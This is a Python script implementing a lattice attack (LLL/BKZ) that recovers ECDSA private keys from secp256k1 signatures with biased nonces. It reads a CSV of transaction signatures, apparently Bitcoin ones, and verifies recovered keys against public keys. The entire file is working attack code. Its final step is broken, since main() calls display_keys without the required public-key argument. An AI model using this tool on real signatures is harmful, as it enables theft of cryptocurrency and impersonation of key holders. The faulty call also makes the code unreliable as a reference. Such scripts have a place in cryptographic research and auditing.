#!/usr/bin/env python
# Author: Dario Clavijo (2020)
# Based on:
# https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
# https://www.youtube.com/watch?v=6ssTlSSIJQE

import sys
import argparse
import mmap
import gmpy2
import binascii
from ecdsa import SigningKey, SECP256k1
from fpylll import IntegerMatrix, LLL, BKZ

# Default order from secp256k1 curve
DEFAULT_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def modular_inv(a, b):
    """Efficient modular inverse"""
    return int(gmpy2.invert(a, b))


def load_csv(filename, limit=None, mmap_flag=False):
    """Load CSV with ECDSA data."""
    msgs, sigs, pubs = [], [], []

    if mmap_flag:
        with open(filename, 'r') as f:
            mapped_file = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            lines = mapped_file.splitlines()
            for n, line in enumerate(lines):
                if limit is not None and n >= limit:
                    break
                l = line.decode('utf-8').rstrip().split(",")
                tx, R, S, Z, pub = l
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(pub)
    else:
        with open(filename, 'r') as fp:
            for n, line in enumerate(fp):
                if limit is not None and n >= limit:
                    break
                tx, R, S, Z, pub = line.rstrip().split(",")
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(pub)

    return msgs, sigs, pubs


def make_matrix_fpylll(msgs, sigs, B, order):
    """
    Construct IntegerMatrix for fpylll reduction.
    """
    m = len(msgs)
    m1, m2 = m + 1, m + 2
    B2 = 1 << B

    mat = IntegerMatrix(m2, m2)

    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
    mi_sn_order = modular_inv(sn, order)
    rnsn_inv = (rn * mi_sn_order) % order
    mnsn_inv = (msgn * mi_sn_order) % order

    for i in range(m):
        mi_sigi_order = modular_inv(sigs[i][1], order)
        mat[i, i] = order
        mat[m, i] = int((sigs[i][0] * mi_sigi_order - rnsn_inv) % order)
        mat[m1, i] = int((msgs[i] * mi_sigi_order - mnsn_inv) % order)

    mat[m, m1] = B2 // order
    mat[m1, m1] = B2

    return mat


def reduce_matrix(matrix, algorithm="LLL"):
    LLL.reduction(matrix)
    if algorithm == "BKZ":
        bkz = BKZ(matrix)
        param = BKZ.Param(block_size=20)
        bkz(param)
    return matrix


def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
    """
    Try recovering private keys from reduced lattice matrix.
    """
    from math import sqrt
    keys = set()
    m = len(msgs)
    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]

    params = []
    for i in range(m):
        a = rn * sigs[i][1]
        b = sn * sigs[i][0]
        c = sn * msgs[i]
        d = msgn * sigs[i][1]
        cd = (c - d) % order
        if a == b:
            ab_list = None
        else:
            ab_list = [(a - b) % order, (b - a) % order]
        params.append((b, cd, ab_list))

    row_norms = []
    for idx in range(matrix.nrows):
        norm2 = sum((float(matrix[idx, j]) ** 2 for j in range(m)))
        row_norms.append((norm2, idx))
    row_norms.sort()

    for _, ridx in row_norms[:max_rows]:
        row = [int(matrix[ridx, j]) for j in range(m)]
        for i, (b, cd, ab_list) in enumerate(params):
            base = (cd - b * row[i])
            if ab_list is None:
                keys.add(base % order)
            else:
                for ab in ab_list:
                    if ab:
                        inv = modular_inv(ab, order)
                        key = (base * inv) % order
                        keys.add(key)
    return list(keys)


def verify_key(privkey, pubkey_hex):
    """
    Verifies whether the private key matches the given compressed or uncompressed pubkey.
    """
    sk = SigningKey.from_secret_exponent(privkey, curve=SECP256k1)
    vk = sk.get_verifying_key()

    x = vk.pubkey.point.x()
    y = vk.pubkey.point.y()
    x_bytes = x.to_bytes(32, byteorder='big')

    # Compressed format
    prefix = b'\x02' if y % 2 == 0 else b'\x03'
    compressed_pub = prefix + x_bytes

    # Uncompressed format
    uncompressed_pub = b'\x04' + vk.to_string()

    pubkey_hex = pubkey_hex.lower()
    return (
        pubkey_hex == compressed_pub.hex()
        or pubkey_hex == uncompressed_pub.hex()
    )


def display_keys(keys, ref_pubkey):
    """Display and verify recovered private keys."""
    for key in keys:
        status = "✔️" if verify_key(key, ref_pubkey) else "❌"
        print(f"{key:064x} {status}")

def main():
    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction (fpylll)")
    parser.add_argument("filename", help="CSV file containing ECDSA traces")
    parser.add_argument("B", type=int, help="log2 bound parameter B")
    parser.add_argument("limit", type=int, help="Limit number of signatures to process")
    parser.add_argument(
        "--order", type=int, default=DEFAULT_ORDER,
        help="Curve order (default: secp256k1)"
    )
    parser.add_argument(
        "--reduction", choices=["LLL", "BKZ"], default="LLL",
        help="Lattice reduction algorithm (default: LLL)"
    )
    parser.add_argument(
        "--mmap", action="store_true",
        help="Enable mmap for fast CSV access"
    )

    args = parser.parse_args()

    msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)
    sys.stderr.write(f"Using: {len(msgs)} sigs...\n")

    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order)
    matrix = reduce_matrix(matrix, algorithm=args.reduction)
    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, args.order)
    display_keys(keys)


if __name__ == "__main__":
    main()